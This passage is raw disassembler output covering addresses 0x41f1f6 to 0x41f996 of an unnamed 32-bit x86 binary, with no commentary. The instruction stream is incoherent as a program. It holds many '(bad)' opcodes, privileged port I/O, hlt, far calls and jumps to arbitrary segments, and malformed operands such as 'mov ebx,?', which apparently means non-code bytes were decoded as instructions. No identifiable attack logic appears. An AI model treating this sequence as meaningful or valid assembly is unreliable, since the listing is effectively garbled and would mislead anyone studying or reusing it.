  41f1f6:	imul   edx,DWORD PTR [ecx+eiz*1-0x48],0xffffff81
  41f1fb:	add    eax,0xd7856596
  41f200:	mov    ebp,0xa5d0d8e
  41f205:	cli    
  41f206:	xchg   ecx,eax
  41f207:	mov    cl,0xda
  41f209:	cmp    BYTE PTR [ecx+0x3f89bb6d],bl
  41f20f:	mov    eax,0x3ce82c9a
  41f214:	jle    0x41f295
  41f216:	bound  ebx,QWORD PTR [esi+edx*4-0x3e542b65]
  41f21d:	inc    edx
  41f21e:	xchg   BYTE PTR [ecx+0x1f4cfb41],ch
  41f224:	or     eax,0x1a609144
  41f22a:	loop   0x41f1e9
  41f22c:	rcr    DWORD PTR ds:[ebx+0x7d],0x8d
  41f231:	out    0x78,eax
  41f233:	jp     0x41f239
  41f235:	lods   eax,DWORD PTR ds:[esi]
  41f236:	shl    BYTE PTR [edx],cl
  41f238:	call   0x6a14:0x91d214c9
  41f23f:	xchg   esi,eax
  41f240:	adc    BYTE PTR [eax-0x34a5a873],0x18
  41f247:	push   ds
  41f248:	dec    ecx
  41f249:	loop   0x41f292
  41f24b:	lods   al,BYTE PTR ds:[esi]
  41f24c:	inc    ebp
  41f24d:	int3   
  41f24e:	xchg   edi,eax
  41f24f:	inc    esi
  41f250:	enter  0xa12a,0x66
  41f254:	pop    es
  41f255:	push   eax
  41f256:	stos   DWORD PTR es:[edi],eax
  41f257:	fprem  
  41f259:	jo     0x41f2c0
  41f25b:	add    eax,0xf916e2a3
  41f260:	or     DWORD PTR [ebx+edx*2],edx
  41f263:	mov    ebp,0x25cb8aca
  41f268:	cmp    ebx,esi
  41f26a:	inc    edi
  41f26b:	mov    edx,edi
  41f26d:	pop    ebp
  41f26e:	call   0x1fdf:0x30e2697b
  41f275:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f276:	mov    dh,0x7e
  41f278:	bts    DWORD PTR [eax+eax*2+0x2c7a09bb],ecx
  41f280:	inc    eax
  41f281:	mov    esp,0x3b47aea0
  41f286:	hlt    
  41f287:	cmp    BYTE PTR [edi+esi*2+0x5070760a],cl
  41f28e:	jno    0x41f300
  41f290:	sbb    dl,dh
  41f292:	retf   
  41f293:	or     BYTE PTR [eax-0x44],dh
  41f296:	xchg   esp,eax
  41f297:	in     eax,dx
  41f298:	jle    0x41f28e
  41f29a:	lock push ecx
  41f29c:	das    
  41f29d:	shl    eax,cl
  41f29f:	loopne 0x41f23e
  41f2a1:	push   esi
  41f2a2:	push   0x3d
  41f2a4:	pop    ss
  41f2a5:	scas   eax,DWORD PTR es:[edi]
  41f2a6:	inc    edi
  41f2a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f2a8:	cmc    
  41f2a9:	xchg   esp,eax
  41f2aa:	pushf  
  41f2ab:	ds mov ebp,0x8159a0c0
  41f2b1:	pop    ss
  41f2b2:	sub    BYTE PTR [ebx+edx*8-0x3084c98a],bh
  41f2b9:	mov    al,ds:0xe54c5d30
  41f2be:	daa    
  41f2bf:	add    edi,eax
  41f2c1:	imul   esp,edx,0x3e
  41f2c4:	les    ebp,FWORD PTR [ecx+0xcbf56ac]
  41f2ca:	repnz sbb ecx,ebp
  41f2cd:	add    BYTE PTR [eax+0x24],ch
  41f2d0:	mov    al,0x69
  41f2d2:	cmp    BYTE PTR [ebx-0x47546bd9],cl
  41f2d8:	sub    ebx,DWORD PTR [ebx+0x653727c2]
  41f2de:	push   eax
  41f2df:	sub    dh,dl
  41f2e1:	call   0xb7a2795d
  41f2e6:	sub    al,0xf8
  41f2e8:	fild   DWORD PTR [eax+eax*1]
  41f2eb:	pop    ds
  41f2ec:	jge    0x41f2e6
  41f2ee:	outs   dx,BYTE PTR ds:[esi]
  41f2ef:	pop    ss
  41f2f0:	inc    ecx
  41f2f1:	or     dh,BYTE PTR [ecx-0x7b]
  41f2f4:	jl     0x41f2ad
  41f2f6:	fnstenv [ecx+0x70]
  41f2f9:	xchg   esi,eax
  41f2fa:	aad    0xc5
  41f2fc:	push   ebx
  41f2fd:	fistp  DWORD PTR ds:0x60ea0005
  41f303:	dec    ebx
  41f304:	mov    esi,0x6cc61cc1
  41f309:	and    BYTE PTR [edi+edx*2],al
  41f30c:	(bad)  
  41f30d:	adc    ah,bh
  41f30f:	pop    ebp
  41f310:	pop    edx
  41f311:	out    dx,eax
  41f312:	cs push ss
  41f314:	repnz push ebp
  41f316:	lods   al,BYTE PTR ds:[esi]
  41f317:	xor    al,0xdb
  41f319:	dec    edx
  41f31a:	sbb    DWORD PTR [edi],esi
  41f31c:	daa    
  41f31d:	or     BYTE PTR [eax+0x44],0xc
  41f321:	adc    al,0xab
  41f323:	sbb    eax,0xb4235344
  41f328:	test   al,0x36
  41f32a:	sub    eax,0x9d8b8391
  41f32f:	add    cl,dh
  41f331:	aam    0xc8
  41f333:	inc    ebp
  41f334:	sub    DWORD PTR [edx+esi*4-0x6d],edi
  41f338:	push   eax
  41f339:	jle    0x41f3ba
  41f33b:	int3   
  41f33c:	out    0xc3,eax
  41f33e:	sub    bl,ch
  41f340:	xor    al,BYTE PTR [esi+0x16]
  41f343:	jno    0x41f370
  41f345:	adc    eax,0x4667c0ac
  41f34a:	or     DWORD PTR [esi+0x67],ecx
  41f34d:	add    al,0x43
  41f34f:	cmp    BYTE PTR [edi+0x4ef8f80d],al
  41f355:	sbb    ebp,DWORD PTR [ecx+0x49ff1b46]
  41f35b:	add    BYTE PTR [eax],bh
  41f35d:	les    ebx,FWORD PTR [edi-0x51d61ee2]
  41f363:	add    BYTE PTR [eax],0x80
  41f366:	push   ds
  41f367:	or     edx,DWORD PTR [eax]
  41f369:	loope  0x41f33f
  41f36b:	add    al,ah
  41f36d:	popf   
  41f36e:	test   eax,0xc6482cd0
  41f373:	add    BYTE PTR [eax+edx*1],dh
  41f376:	dec    edx
  41f377:	pop    ebx
  41f378:	mov    ebx,?
  41f37a:	mov    ds:0x84ddb277,al
  41f37f:	(bad)  
  41f380:	pop    ebx
  41f381:	push   ebx
  41f382:	pop    ebp
  41f383:	mov    esp,0x462160
  41f388:	xor    BYTE PTR [eax+0x927e2a6],dl
  41f38e:	inc    esp
  41f38f:	or     esp,DWORD PTR [eax+eax*1-0x2e]
  41f393:	ja     0x41f337
  41f395:	or     BYTE PTR [ecx-0x6a],al
  41f398:	lods   eax,DWORD PTR ds:[esi]
  41f399:	ret    
  41f39a:	jbe    0x41f3b2
  41f39c:	sub    BYTE PTR [edx],0x52
  41f39f:	pop    ebx
  41f3a0:	out    dx,al
  41f3a1:	bound  edi,QWORD PTR [ebx-0x63]
  41f3a4:	adc    cl,dh
  41f3a6:	jecxz  0x41f424
  41f3a8:	mov    dl,0xa4
  41f3aa:	xchg   ebp,eax
  41f3ab:	or     BYTE PTR ds:0x5185bb6d,ch
  41f3b1:	mov    dh,0xd5
  41f3b3:	repz imul edx,DWORD PTR [ebp+0x53],0xc9eba06c
  41f3bb:	sub    al,0x86
  41f3bd:	test   eax,0x731b2fc4
  41f3c2:	shl    DWORD PTR [esi],0x45
  41f3c5:	xor    DWORD PTR [edi+0x25],ecx
  41f3c8:	loop   0x41f3a9
  41f3ca:	jl     0x41f3fc
  41f3cc:	or     BYTE PTR [ebp-0x713de68c],0xab
  41f3d3:	retf   0x95fa
  41f3d6:	xchg   ecx,eax
  41f3d7:	xor    DWORD PTR [ecx+ebp*8-0x75],ebx
  41f3db:	mov    ds:0x3225e51,al
  41f3e0:	imul   esp,DWORD PTR [ebx-0x6698e265],0x3b
  41f3e7:	dec    eax
  41f3e8:	mov    BYTE PTR [esi+0x1415acd1],0x6b
  41f3ef:	fdivr  DWORD PTR [esi+edx*4]
  41f3f2:	inc    ecx
  41f3f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f3f4:	fsub   DWORD PTR [edx]
  41f3f6:	pop    eax
  41f3f7:	(bad)  
  41f3f8:	jo     0x41f392
  41f3fa:	int3   
  41f3fb:	ins    DWORD PTR es:[edi],dx
  41f3fc:	cwde   
  41f3fd:	loopne 0x41f43b
  41f3ff:	push   ds
  41f400:	mov    dl,al
  41f402:	push   ds
  41f403:	dec    ebp
  41f404:	and    DWORD PTR [ebx+0x58],ebx
  41f407:	ret    0xb39f
  41f40a:	and    eax,0x63134d8a
  41f40f:	and    DWORD PTR [edi],edx
  41f411:	adc    DWORD PTR [edx],eax
  41f413:	cmp    cl,cl
  41f415:	adc    bl,BYTE PTR [edx+0xa6f6b4]
  41f41b:	sbb    ch,0x6b
  41f41e:	xchg   ebx,eax
  41f41f:	stos   DWORD PTR es:[edi],eax
  41f420:	mov    al,0xa
  41f422:	add    dh,bl
  41f424:	fst    DWORD PTR [ebx]
  41f426:	cmp    eax,0x7d81b26e
  41f42b:	inc    edx
  41f42c:	mov    WORD PTR [esi-0x2b],es
  41f42f:	cmp    eax,0x3bdb15a
  41f434:	mov    ebx,DWORD PTR [edx]
  41f436:	cmp    BYTE PTR [edx],bl
  41f438:	sahf   
  41f439:	iret   
  41f43a:	push   es
  41f43b:	pop    es
  41f43c:	adc    al,0xbd
  41f43e:	mov    WORD PTR [eax],es
  41f440:	mov    DWORD PTR [ebx-0x17],0x1f1743ee
  41f447:	mov    ch,0xb2
  41f449:	sbb    al,0x2b
  41f44b:	sbb    BYTE PTR [edi+0x7],al
  41f44e:	mov    al,ds:0x69ebc288
  41f453:	cmp    DWORD PTR ds:0x9cf51735,edi
  41f459:	sbb    bl,BYTE PTR [esi+eax*1]
  41f45c:	cdq    
  41f45d:	xor    BYTE PTR [edi],0x88
  41f460:	inc    edi
  41f461:	adc    al,0xbf
  41f463:	dec    esp
  41f464:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f465:	xor    DWORD PTR [ecx],ebp
  41f467:	xchg   esp,eax
  41f468:	mov    edi,0x886e8b4f
  41f46d:	iret   
  41f46e:	frstor [ebp-0x593741]
  41f474:	dec    ebx
  41f475:	fist   DWORD PTR [edx+0x8]
  41f478:	in     eax,dx
  41f479:	hlt    
  41f47a:	jg     0x41f4ab
  41f47c:	iret   
  41f47d:	adc    ch,bl
  41f47f:	and    eax,0x44d6c52b
  41f484:	sbb    al,0xa7
  41f486:	ror    DWORD PTR [edi-0x72293a82],1
  41f48c:	cwde   
  41f48d:	stos   DWORD PTR es:[edi],eax
  41f48e:	push   ecx
  41f48f:	sar    BYTE PTR [eax-0x61],1
  41f492:	sbb    eax,0x974c51c3
  41f497:	jmp    0xb6da:0x741d3808
  41f49e:	repnz loope 0x41f4c8
  41f4a1:	stc    
  41f4a2:	nop
  41f4a3:	or     al,0x2d
  41f4a5:	pushf  
  41f4a6:	dec    ecx
  41f4a7:	mov    ?,eax
  41f4a9:	jnp    0x41f44f
  41f4ab:	mov    edi,0x8db1627
  41f4b0:	daa    
  41f4b1:	push   esi
  41f4b2:	mov    ebp,0x19d9d7c5
  41f4b7:	xchg   esp,eax
  41f4b8:	push   edx
  41f4b9:	adc    edx,edi
  41f4bb:	std    
  41f4bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f4bd:	lahf   
  41f4be:	xchg   ecx,eax
  41f4bf:	sub    dl,ch
  41f4c1:	push   esp
  41f4c2:	fcom   DWORD PTR [esi]
  41f4c4:	test   eax,0x235ea56d
  41f4c9:	cwde   
  41f4ca:	enter  0x31b5,0x4
  41f4ce:	test   al,0xd8
  41f4d0:	pop    ebp
  41f4d1:	pop    edx
  41f4d2:	mov    ebx,0x4327e1b6
  41f4d7:	xor    BYTE PTR [ecx-0x6e],dh
  41f4da:	imul   esp,DWORD PTR [ecx],0x83e168d4
  41f4e0:	int    0xea
  41f4e2:	cmp    eax,0x27717915
  41f4e7:	dec    ebp
  41f4e8:	lahf   
  41f4e9:	lahf   
  41f4ea:	ds jne 0x41f519
  41f4ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f4ee:	pop    esp
  41f4ef:	xchg   esp,eax
  41f4f0:	and    esp,DWORD PTR [esi+0x208997b4]
  41f4f6:	std    
  41f4f7:	(bad)  [eax]
  41f4f9:	lahf   
  41f4fa:	out    dx,eax
  41f4fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f4fc:	pop    ecx
  41f4fd:	retf   
  41f4fe:	mov    al,0x22
  41f500:	daa    
  41f501:	rol    DWORD PTR [edx],cl
  41f503:	mov    edi,0x97c794a4
  41f508:	push   esi
  41f509:	push   0x38
  41f50b:	shr    bl,0xe
  41f50e:	repz pushf 
  41f510:	inc    ebx
  41f511:	pop    DWORD PTR ds:0x1680acc8
  41f517:	ins    BYTE PTR es:[edi],dx
  41f518:	in     eax,dx
  41f519:	test   al,0xe8
  41f51b:	mov    dh,0xf7
  41f51d:	dec    esi
  41f51e:	sub    edx,0xffffff81
  41f521:	push   eax
  41f522:	jns    0x41f4b2
  41f524:	add    BYTE PTR [eax+0x4c202b8],al
  41f52a:	pop    esi
  41f52b:	enter  0x4af3,0x9e
  41f52f:	scas   eax,DWORD PTR es:[edi]
  41f530:	loop   0x41f52b
  41f532:	xchg   BYTE PTR [ecx+0x54811524],ah
  41f538:	fbld   TBYTE PTR [esi+0x2c6f6e2]
  41f53e:	shl    DWORD PTR [esp+eiz*8-0x20ba5ee4],1
  41f545:	sbb    dl,dh
  41f547:	arpl   WORD PTR [edx+0x26a79ae5],ax
  41f54d:	xchg   eax,ebx
  41f54f:	(bad)  
  41f550:	push   ebp
  41f551:	cmp    ch,ch
  41f553:	pop    es
  41f554:	cmp    cl,BYTE PTR ds:0x6517419c
  41f55a:	mov    gs,ebp
  41f55c:	pop    ds
  41f55d:	cmp    DWORD PTR fs:[edi-0xec93fef],esi
  41f564:	cli    
  41f565:	adc    eax,0x718637a3
  41f56a:	and    ch,bl
  41f56c:	ss (bad) 
  41f56e:	jbe    0x41f529
  41f570:	and    al,dl
  41f572:	sbb    edx,DWORD PTR [ebp+edx*1-0x15]
  41f576:	sbb    al,0x8d
  41f578:	xor    BYTE PTR es:[edi+0x6d],dl
  41f57c:	stos   DWORD PTR es:[edi],eax
  41f57d:	add    edi,eax
  41f57f:	sub    bl,bl
  41f581:	cli    
  41f582:	xchg   esp,esp
  41f584:	out    dx,eax
  41f585:	(bad)  
  41f587:	xor    eax,0xc90b56b5
  41f58c:	jo     0x41f590
  41f58e:	fnstcw WORD PTR [eax+0x58]
  41f591:	or     eax,0xa7541a04
  41f596:	or     BYTE PTR [ebx],cl
  41f598:	xor    BYTE PTR [esi+0x67c1a18a],dl
  41f59e:	(bad)  
  41f59f:	push   0x25
  41f5a1:	fisub  WORD PTR [ebx+0x4019b48d]
  41f5a7:	mov    fs,WORD PTR [eax]
  41f5a9:	loopne 0x41f59d
  41f5ab:	stc    
  41f5ac:	xchg   ebp,eax
  41f5ad:	push   0xb5aa504
  41f5b2:	mov    ecx,0xd33e1844
  41f5b7:	inc    esp
  41f5b8:	cmp    eax,0xc33388bf
  41f5bd:	jle    0x41f5bb
  41f5bf:	neg    ah
  41f5c1:	sub    al,0x26
  41f5c3:	fstp   DWORD PTR [eax]
  41f5c5:	mov    bh,0xb1
  41f5c7:	cld    
  41f5c8:	daa    
  41f5c9:	mov    al,ds:0x9a02aca7
  41f5ce:	fsubp  st(1),st
  41f5d0:	rol    ecx,cl
  41f5d2:	inc    ecx
  41f5d3:	rcl    BYTE PTR [edi-0x30],0x4f
  41f5d7:	fcmovb st,st(7)
  41f5d9:	or     esi,DWORD PTR [edi-0xd]
  41f5dc:	ret    
  41f5dd:	mov    edx,0xb03b1bdb
  41f5e2:	mov    al,0xaa
  41f5e4:	hlt    
  41f5e5:	fiadd  WORD PTR [ecx+0x45]
  41f5e8:	sbb    eax,0x408318f
  41f5ed:	fidiv  WORD PTR [ecx]
  41f5ef:	sbb    DWORD PTR [edi+0x27],0x20
  41f5f3:	js     0x41f5c9
  41f5f5:	add    BYTE PTR [eax-0x70],ah
  41f5f8:	bnd jnp 0x41f5a8
  41f5fb:	nop
  41f5fc:	push   esi
  41f5fd:	jl     0x41f66c
  41f5ff:	lea    esi,[edi+ebx*2+0x73d1c09a]
  41f606:	repz fidivr WORD PTR [ecx-0x17]
  41f60a:	pusha  
  41f60b:	(bad)  
  41f60c:	mov    ebx,0x396bfea1
  41f611:	mov    ss,WORD PTR [eax-0xf]
  41f614:	or     ebp,esp
  41f616:	in     al,dx
  41f617:	or     eax,0x145330b4
  41f61c:	pushf  
  41f61d:	fnstenv [esi+edx*1+0x77]
  41f621:	repz test eax,0xd53ad327
  41f627:	fimul  DWORD PTR [esi]
  41f629:	scas   al,BYTE PTR es:[edi]
  41f62a:	scas   eax,DWORD PTR es:[edi]
  41f62b:	out    0x55,al
  41f62d:	out    0xd8,eax
  41f62f:	std    
  41f630:	xor    cl,al
  41f632:	jae    0x41f5f9
  41f634:	repnz or DWORD PTR [eax],eax
  41f637:	pushf  
  41f638:	inc    ecx
  41f639:	mov    al,0x90
  41f63b:	xlat   BYTE PTR ds:[ebx]
  41f63c:	das    
  41f63d:	mov    edi,es
  41f63f:	push   ecx
  41f640:	mov    ds:0xe1e9d30,al
  41f645:	ret    0x5a0
  41f648:	mov    ebx,0xcc3fd68b
  41f64d:	jnp    0x41f5e4
  41f64f:	or     DWORD PTR [eax],eax
  41f651:	sbb    eax,DWORD PTR [edx+0x6429c62e]
  41f657:	mov    ah,0x8b
  41f659:	fmul   DWORD PTR [ebx+ebp*2+0x75]
  41f65d:	xchg   ecx,eax
  41f65e:	arpl   bx,sp
  41f660:	or     al,0xd2
  41f662:	into   
  41f663:	adc    al,0xbf
  41f665:	test   ebp,0xe6a27c6d
  41f66b:	ret    
  41f66c:	push   edx
  41f66d:	and    cl,BYTE PTR [ebp+0x23c1509f]
  41f673:	cld    
  41f674:	jge    0x41f611
  41f676:	dec    edx
  41f677:	pop    edx
  41f678:	and    al,0xbd
  41f67a:	outs   dx,DWORD PTR ds:[esi]
  41f67b:	aam    0x1b
  41f67d:	mov    al,0x68
  41f67f:	xor    eax,0xb6367c47
  41f684:	dec    ebp
  41f685:	in     al,0xd0
  41f687:	or     DWORD PTR [ecx+eiz*2+0xa1d4cb3],eax
  41f68e:	outs   dx,DWORD PTR ds:[esi]
  41f68f:	shl    BYTE PTR [ebp+0x7bffa290],0x84
  41f696:	push   esi
  41f697:	cld    
  41f698:	pop    es
  41f699:	shr    DWORD PTR [edx-0x51],1
  41f69c:	and    ch,BYTE PTR [esp+ebx*4-0x1b]
  41f6a0:	lds    edx,FWORD PTR [eax]
  41f6a2:	pop    esi
  41f6a3:	xor    edx,DWORD PTR [edx+edx*2+0x1531b282]
  41f6aa:	and    al,0x83
  41f6ac:	jo     0x41f716
  41f6ae:	sub    DWORD PTR [ecx],ecx
  41f6b0:	or     BYTE PTR [ecx+0x19],al
  41f6b3:	cld    
  41f6b4:	xor    ecx,DWORD PTR [eax]
  41f6b6:	sub    al,0x64
  41f6b8:	xor    edx,DWORD PTR [edx+eax*2-0x3815d2e1]
  41f6bf:	pop    edx
  41f6c0:	gs cld 
  41f6c2:	test   al,0xd0
  41f6c4:	sub    BYTE PTR [eax+esi*8+0x76],0x8
  41f6c9:	cmp    eax,0xd3464037
  41f6ce:	gs sbb al,0x40
  41f6d1:	test   ch,dl
  41f6d3:	or     eax,DWORD PTR [eax]
  41f6d5:	fidiv  WORD PTR [ecx-0x80]
  41f6d8:	mov    ch,0xdc
  41f6da:	and    cl,0x7e
  41f6dd:	jnp    0x41f6a7
  41f6df:	sub    DWORD PTR [eax],esp
  41f6e1:	jo     0x41f745
  41f6e3:	mov    edi,0x75f5e44f
  41f6e8:	lods   al,BYTE PTR ds:[esi]
  41f6e9:	shl    DWORD PTR [edi+0x503862c6],cl
  41f6ef:	mov    ah,0xd4
  41f6f1:	clc    
  41f6f2:	loopne 0x41f683
  41f6f4:	dec    ebx
  41f6f5:	xor    eax,0x80933b3c
  41f6fa:	inc    ebx
  41f6fb:	lea    esi,[ebp+0x8]
  41f6fe:	cwde   
  41f6ff:	iret   
  41f700:	sub    BYTE PTR [esi-0x1f],dl
  41f703:	mov    edi,es
  41f705:	icebp  
  41f706:	or     DWORD PTR [esi+0x0],0xffffffd3
  41f70a:	lea    ebp,[edx]
  41f70c:	jge    0x41f70b
  41f70e:	fimul  WORD PTR [eax+0x4c]
  41f711:	sbb    BYTE PTR ds:0x187c761d,0x22
  41f718:	jnp    0x41f6c4
  41f71a:	mov    cl,0xf5
  41f71c:	in     al,0x1c
  41f71e:	loop   0x41f72d
  41f720:	into   
  41f721:	in     al,0xdf
  41f723:	aas    
  41f724:	out    0x67,al
  41f726:	dec    ecx
  41f727:	add    ch,BYTE PTR [ecx-0x68]
  41f72a:	inc    bh
  41f72c:	adc    cl,BYTE PTR [ebx]
  41f72e:	mov    ecx,0xc2218ad8
  41f733:	ss das 
  41f735:	adc    ch,BYTE PTR [eax+0x4]
  41f738:	int3   
  41f739:	push   DWORD PTR ds:0xc65d4314
  41f73f:	inc    ebx
  41f740:	pushf  
  41f741:	cmp    BYTE PTR ss:[ecx+0x61c38409],0xac
  41f749:	xchg   esp,eax
  41f74a:	or     DWORD PTR [ebp+0x64],ebp
  41f74d:	sub    BYTE PTR [ecx],bh
  41f74f:	and    bl,0x12
  41f752:	retf   
  41f753:	adc    BYTE PTR [edx+0x7f7127b],ah
  41f759:	push   eax
  41f75a:	outs   dx,DWORD PTR ds:[esi]
  41f75b:	jbe    0x41f76d
  41f75d:	or     bh,al
  41f75f:	icebp  
  41f760:	dec    edx
  41f761:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f762:	mov    DWORD PTR [edi+0x4b],edi
  41f765:	dec    edi
  41f766:	mov    al,ds:0x7b61a95d
  41f76b:	fmul   QWORD PTR [edi+0x7140d4c3]
  41f771:	sbb    eax,0xcf24ba4c
  41f776:	pop    ebx
  41f777:	cdq    
  41f778:	(bad)  
  41f779:	jecxz  0x41f726
  41f77b:	adc    eax,0xac597f25
  41f780:	into   
  41f781:	cmp    al,0xfc
  41f783:	loopne 0x41f7ae
  41f785:	daa    
  41f786:	jecxz  0x41f76c
  41f788:	mov    al,0x8b
  41f78a:	int3   
  41f78b:	xchg   ebp,eax
  41f78c:	ja     0x41f7ab
  41f78e:	xor    eax,0xb4ed27a0
  41f793:	mov    edi,esp
  41f795:	push   ss
  41f796:	(bad)  
  41f797:	mov    al,ds:0xfb97e6
  41f79c:	jnp    0x41f817
  41f79e:	into   
  41f79f:	mov    ebx,0x7756c1fd
  41f7a4:	xor    eax,0x3fd2a316
  41f7a9:	pop    es
  41f7aa:	jecxz  0x41f7dd
  41f7ac:	xor    al,0x10
  41f7ae:	call   0x42f7c25c
  41f7b3:	nop
  41f7b4:	(bad)  
  41f7b5:	xlat   BYTE PTR ds:[ebx]
  41f7b6:	icebp  
  41f7b7:	test   al,0x0
  41f7b9:	xor    BYTE PTR [edi+0x3a],0x4f
  41f7bd:	push   ebx
  41f7be:	jle    0x41f82d
  41f7c0:	mov    ch,0xbd
  41f7c2:	inc    ecx
  41f7c3:	cmp    BYTE PTR [edx],ah
  41f7c5:	test   BYTE PTR [edx-0x6f],ah
  41f7c8:	sar    ebp,cl
  41f7ca:	mov    edi,0xef4cbdfa
  41f7cf:	ins    BYTE PTR es:[edi],dx
  41f7d0:	loope  0x41f7cb
  41f7d2:	popf   
  41f7d3:	jle    0x41f7d8
  41f7d5:	mov    esi,0x2e7d0a51
  41f7da:	lock ret 
  41f7dc:	sbb    edi,DWORD PTR [ebx-0xc]
  41f7df:	ins    DWORD PTR es:[edi],dx
  41f7e0:	cdq    
  41f7e1:	mov    BYTE PTR [edi-0x6e894169],bh
  41f7e7:	dec    edx
  41f7e8:	jne    0x41f7fb
  41f7ea:	xchg   ebp,eax
  41f7eb:	test   DWORD PTR [ecx-0x51bc5ac4],0x8bb0e749
  41f7f5:	or     dh,BYTE PTR [edx+0x11]
  41f7f8:	lods   eax,DWORD PTR ds:[esi]
  41f7f9:	inc    ecx
  41f7fa:	lds    ecx,FWORD PTR [edx]
  41f7fc:	rcr    BYTE PTR [ecx-0x24],0xa7
  41f800:	cmp    ah,BYTE PTR [esi-0x4bb0d02d]
  41f806:	jg     0x41f887
  41f808:	mov    cl,0x78
  41f80a:	out    0x12,eax
  41f80c:	cmp    BYTE PTR [esi-0x5e],ch
  41f80f:	and    bh,BYTE PTR [edi-0x618442e4]
  41f815:	sbb    ecx,DWORD PTR [ebx+0x68a6fbaa]
  41f81b:	lds    eax,FWORD PTR [esi+0x22]
  41f81e:	bound  esi,QWORD PTR [ebp-0x45]
  41f821:	mov    BYTE PTR [ecx-0x7fcde7a3],bl
  41f827:	inc    ebp
  41f828:	int    0xdb
  41f82a:	inc    esi
  41f82b:	aas    
  41f82c:	cld    
  41f82d:	inc    esp
  41f82e:	call   0xb413:0x17b317c0
  41f835:	add    cl,0x78
  41f838:	outs   dx,DWORD PTR ds:[esi]
  41f839:	test   cl,dh
  41f83b:	test   DWORD PTR [esi+0xa],edx
  41f83e:	xchg   DWORD PTR [ecx-0x72],ebx
  41f841:	ins    DWORD PTR es:[edi],dx
  41f842:	fldenv [esi+esi*8]
  41f845:	nop
  41f846:	cmp    eax,0xb882468c
  41f84b:	test   eax,0xe80b82b8
  41f850:	sub    bh,BYTE PTR [esi+eax*4-0x9]
  41f854:	std    
  41f855:	and    al,0x2b
  41f857:	mov    edx,0xf111b53b
  41f85c:	push   0xd7410288
  41f861:	mov    ds:0x569844dd,al
  41f866:	jb     0x41f80c
  41f868:	rol    ah,1
  41f86a:	jnp    0x41f8ce
  41f86c:	or     eax,0x487b7925
  41f871:	mov    edi,DWORD PTR [edi]
  41f873:	xor    bl,BYTE PTR [ecx+eax*8-0x5d226992]
  41f87a:	mov    ds:0x3572d30c,al
  41f87f:	or     DWORD PTR [eax],edx
  41f881:	push   ecx
  41f882:	pop    edx
  41f883:	ror    BYTE PTR [edx],0x81
  41f886:	sub    BYTE PTR [edx+ecx*1-0x50],ah
  41f88a:	shl    dl,1
  41f88c:	mov    BYTE PTR [ebx+0x7ca540d8],0x7f
  41f893:	jne    0x41f89a
  41f895:	push   edi
  41f896:	int3   
  41f897:	aad    0xb1
  41f899:	pop    ss
  41f89a:	stos   DWORD PTR es:[edi],eax
  41f89b:	add    BYTE PTR [eax],ah
  41f89d:	add    DWORD PTR [ecx-0xbfbffe6],0xffffffba
  41f8a4:	add    edi,DWORD PTR [ebp-0x1f]
  41f8a7:	popf   
  41f8a8:	or     eax,0x5fda7a88
  41f8ad:	add    BYTE PTR [ebp+0x5c],dl
  41f8b0:	xor    ecx,0x119cbb7e
  41f8b6:	xor    eax,0x8df025d0
  41f8bb:	rcr    BYTE PTR [edi-0x50106ac8],1
  41f8c1:	sbb    BYTE PTR [ebp-0x2460d89d],cl
  41f8c7:	mov    ds:0xdcb2dfd2,al
  41f8cc:	shr    DWORD PTR [edi],0x8
  41f8cf:	outs   dx,BYTE PTR ds:[esi]
  41f8d0:	das    
  41f8d1:	sbb    eax,0xca85411d
  41f8d6:	ja     0x41f935
  41f8d8:	test   eax,0xe0027188
  41f8dd:	xor    esp,DWORD PTR [esi-0x460c0fba]
  41f8e3:	adc    dl,BYTE PTR ds:0x1f2c8cb2
  41f8e9:	pop    eax
  41f8ea:	adc    eax,DWORD PTR [eax+0x749b32a4]
  41f8f0:	adc    DWORD PTR [esp+ebp*8+0x5b59020d],esp
  41f8f7:	cmc    
  41f8f8:	mov    bl,0x8b
  41f8fa:	xchg   edi,eax
  41f8fb:	sar    bh,cl
  41f8fd:	mov    edi,0xd6c5dc28
  41f902:	and    DWORD PTR [ebx+0xd],ebx
  41f905:	rcr    dh,cl
  41f907:	call   0x41e54027
  41f90c:	push   esi
  41f90d:	push   esp
  41f90e:	pop    eax
  41f90f:	inc    ecx
  41f910:	xchg   ebp,eax
  41f911:	mov    edi,0xc09632bd
  41f916:	inc    ecx
  41f917:	xchg   esi,eax
  41f918:	mov    edx,0x44a47749
  41f91d:	jmp    0x19c0:0x9e41e841
  41f924:	mov    esp,eax
  41f926:	xor    BYTE PTR [edi+edx*1-0x13],al
  41f92a:	out    dx,al
  41f92b:	call   0xe18d:0xfa9d1f05
  41f932:	or     BYTE PTR [esi],dl
  41f934:	or     DWORD PTR [edx],edi
  41f936:	sub    DWORD PTR [edx],eax
  41f938:	sar    DWORD PTR [eax+0x290760e5],0xc5
  41f93f:	lods   eax,DWORD PTR ds:[esi]
  41f940:	mov    ecx,0xe67ce214
  41f945:	and    DWORD PTR [esi+0x78],esi
  41f948:	sub    ah,BYTE PTR [eax+0x60]
  41f94b:	sahf   
  41f94c:	outs   dx,BYTE PTR ds:[esi]
  41f94d:	ret    0xb216
  41f950:	lods   al,BYTE PTR ds:[esi]
  41f951:	pop    ss
  41f952:	xchg   esp,eax
  41f953:	or     bl,BYTE PTR [eax-0x3c490b18]
  41f959:	adc    eax,DWORD PTR [ebx+0x11f1f9f2]
  41f95f:	mov    esp,0x29606322
  41f964:	pop    ss
  41f965:	inc    ebx
  41f966:	je     0x41f98c
  41f968:	sub    DWORD PTR [ecx+0x32],0xfe571dc0
  41f96f:	repnz push ds
  41f971:	stc    
  41f972:	aad    0x46
  41f974:	shr    BYTE PTR es:[edi-0x29],cl
  41f978:	or     al,0xdf
  41f97a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f97b:	fdiv   DWORD PTR [edi]
  41f97d:	xor    eax,DWORD PTR [edi+ebp*4]
  41f980:	inc    ebp
  41f981:	test   bh,0x21
  41f984:	idiv   bl
  41f986:	xor    ch,bl
  41f988:	push   esp
  41f989:	(bad)  
  41f98a:	jmp    0x46f0:0xc78e82cc
  41f991:	push   0xbd0fa37a
  41f996:	popa   
